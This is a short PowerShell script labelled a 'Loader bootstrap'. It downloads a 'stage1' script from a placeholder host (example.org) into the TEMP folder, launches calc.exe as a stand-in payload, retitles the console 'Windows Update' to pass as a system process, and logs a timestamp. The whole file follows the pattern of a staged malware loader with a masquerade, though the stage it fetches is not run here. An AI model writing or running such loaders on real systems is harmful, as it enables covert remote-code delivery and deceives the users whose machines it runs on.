
<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://example.org:443/stage1.ps1',
    [string]$Stage2Path = "$env:TEMP\stage1.bin",
    [int]$TimeoutSec = 141
)
Invoke-WebRequest -Uri $Stage1Url -OutFile $Stage2Path -UseBasicParsing
Start-Process -FilePath "calc.exe"
$Host.UI.RawUI.WindowTitle = "Windows Update"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
